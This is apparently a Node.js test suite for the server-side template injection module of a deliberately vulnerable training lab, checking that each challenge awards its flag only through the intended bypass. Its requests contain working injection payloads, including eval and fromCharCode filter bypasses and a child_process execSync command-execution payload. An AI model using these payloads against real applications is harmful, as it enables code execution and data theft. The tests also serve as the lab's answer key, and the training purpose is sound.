'use strict';
// SSTI module: every challenge must be solvable by the documented technique and
// must NOT be solvable by the obvious shortcut.
const test = require('node:test');
const assert = require('node:assert/strict');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

test('ssti module', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (id) => flagFromDb(dataDir, 'ssti', id);

  await t.test('module page renders, links resolve, no em dash', async () => {
    const c = client(srv.base);
    const { status, text } = await c.get('/ssti');
    assert.equal(status, 200);
    assert.ok(!text.includes(String.fromCharCode(0x2014)), 'em dash in page');
    assert.ok(!/<table>/.test(text), 'unstyled table');
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 9);
    assert.equal((text.match(FLAG_RE) || []).length, 0);
    for (const href of ['/ssti/greet', '/ssti/wordfilter', '/ssti/nounderscore', '/ssti/nobrackets', '/ssti/dotblock', '/ssti/curly', '/ssti/noquotes', '/ssti/exec']) {
      const r = await c.get(href);
      assert.notEqual(r.status, 404, href);
    }
  });

  await t.test('basic: plain name gives nothing, name={{7*7}} earns the flag', async () => {
    const c = client(srv.base);
    const benign = await c.get('/ssti/greet?name=izaz');
    assert.ok(!benign.text.includes(flagOf('basic')), 'plain name must not award');
    const hit = await c.get('/ssti/greet?name={{7*7}}');
    assert.ok(hit.text.includes('49'));
    assert.ok(hit.text.includes(flagOf('basic')));
    assert.ok((await capturedSet(c)).includes('ssti:Basic Template Injection'));
  });

  await t.test('rce: probing the scope earns the flag, arithmetic does not', async () => {
    const c = client(srv.base);
    const probe = await c.get('/ssti/greet?name={{secretFlag}}');
    assert.ok(probe.text.includes(flagOf('rce')));
    assert.ok(!(await capturedSet(c)).includes('ssti:Basic Template Injection'), 'scope leak must not award basic');
    assert.ok((await capturedSet(c)).includes('ssti:Scope Leak (Data Exposure, Not RCE)'));
  });

  await t.test('ssti-wordfilter: typing the blocked word fails, building it at runtime earns the flag', async () => {
    const c = client(srv.base);
    const shortcut = await c.get('/ssti/wordfilter?input={{vaultSecret}}');
    assert.ok(!shortcut.text.includes(flagOf('ssti-wordfilter')), 'blocked word typed directly must not award');
    const hit = await c.get('/ssti/wordfilter?input={{eval("vaultSec"%2B"ret")}}');
    assert.ok(hit.text.includes(flagOf('ssti-wordfilter')));
    assert.ok((await capturedSet(c)).includes('ssti:Word Blacklist Bypass'));
  });

  await t.test('ssti-nounderscore: typing the underscore fails, char code bypass earns the flag', async () => {
    const c = client(srv.base);
    const shortcut = await c.get('/ssti/nounderscore?input={{db_pass}}');
    assert.ok(!shortcut.text.includes(flagOf('ssti-nounderscore')), 'underscore typed directly must not award');
    const hit = await c.get('/ssti/nounderscore?input={{eval("db"%2BString.fromCharCode(95)%2B"pass")}}');
    assert.ok(hit.text.includes(flagOf('ssti-nounderscore')));
    assert.ok((await capturedSet(c)).includes('ssti:Underscore Blacklist Bypass'));
  });

  await t.test('ssti-nobrackets: indexing fails, dumping the object earns the flag', async () => {
    const c = client(srv.base);
    const shortcut = await c.get("/ssti/nobrackets?input={{cfg['db-pass']}}");
    assert.ok(!shortcut.text.includes(flagOf('ssti-nobrackets')), 'bracket indexing must not award');
    const hit = await c.get('/ssti/nobrackets?input={{JSON.stringify(cfg)}}');
    assert.ok(hit.text.includes(flagOf('ssti-nobrackets')));
    assert.ok((await capturedSet(c)).includes('ssti:Bracket Blacklist Bypass'));
  });

  await t.test('ssti-dotblock: dot access fails, bracket notation earns the flag', async () => {
    const c = client(srv.base);
    const shortcut = await c.get('/ssti/dotblock?input={{db.key}}');
    assert.ok(!shortcut.text.includes(flagOf('ssti-dotblock')), 'dot access must not award');
    const hit = await c.get('/ssti/dotblock?input={{db["key"]}}');
    assert.ok(hit.text.includes(flagOf('ssti-dotblock')));
    assert.ok((await capturedSet(c)).includes('ssti:Dot Blacklist Bypass'));
  });

  await t.test('ssti-curly: single braces get stripped, doubled braces earn the flag', async () => {
    const c = client(srv.base);
    const shortcut = await c.get('/ssti/curly?input={{7*7}}');
    assert.ok(!shortcut.text.includes(flagOf('ssti-curly')), 'single braces must not award');
    const hit = await c.get('/ssti/curly?input={{{{7*7}}}}');
    assert.ok(hit.text.includes('49'));
    assert.ok(hit.text.includes(flagOf('ssti-curly')));
    assert.ok((await capturedSet(c)).includes('ssti:Curly-Brace Strip Bypass'));
  });

  await t.test('ssti-noquotes: arithmetic alone is not enough, fromCharCode plus eval earns the flag', async () => {
    const c = client(srv.base);
    const shortcut = await c.get('/ssti/noquotes?input={{7*7}}');
    assert.ok(shortcut.text.includes('49'));
    assert.ok(!shortcut.text.includes(flagOf('ssti-noquotes')), 'arithmetic must not award');
    const hit = await c.get('/ssti/noquotes?input={{eval(String.fromCharCode(118,97,117,108,116,75,101,121))}}');
    assert.ok(hit.text.includes(flagOf('ssti-noquotes')));
    assert.ok((await capturedSet(c)).includes('ssti:Quote Blacklist Bypass'));
  });

  await t.test('ssti-rce: arithmetic alone is not enough, execSync earns the flag', async () => {
    const c = client(srv.base);
    const shortcut = await c.get('/ssti/exec?expr={{7*7}}');
    assert.ok(shortcut.text.includes('49'));
    assert.ok(!shortcut.text.includes(flagOf('ssti-rce')), 'arithmetic must not award');
    const hit = await c.get('/ssti/exec?expr={{require("child_process").execSync("id").toString()}}');
    assert.ok(hit.text.includes('uid='));
    assert.ok(hit.text.includes(flagOf('ssti-rce')));
    assert.ok((await capturedSet(c)).includes('ssti:SSTI to Remote Code Execution'));
  });

  await t.test('scoreboard lists each captured challenge exactly once', async () => {
    const c = client(srv.base);
    await c.get('/ssti/greet?name={{7*7}}');
    await c.get('/ssti/greet?name={{secretFlag}}');
    await c.get('/ssti/wordfilter?input={{eval("vaultSec"%2B"ret")}}');
    await c.get('/ssti/nounderscore?input={{eval("db"%2BString.fromCharCode(95)%2B"pass")}}');
    await c.get('/ssti/nobrackets?input={{JSON.stringify(cfg)}}');
    await c.get('/ssti/dotblock?input={{db["key"]}}');
    await c.get('/ssti/curly?input={{{{7*7}}}}');
    await c.get('/ssti/noquotes?input={{eval(String.fromCharCode(118,97,117,108,116,75,101,121))}}');
    await c.get('/ssti/exec?expr={{require("child_process").execSync("id").toString()}}');
    await c.get('/ssti/exec?expr={{require("child_process").execSync("id").toString()}}');
    const got = (await capturedSet(c)).filter((s) => s.startsWith('ssti:'));
    assert.equal(got.length, 9);
    assert.equal(new Set(got).size, 9);
  });
});
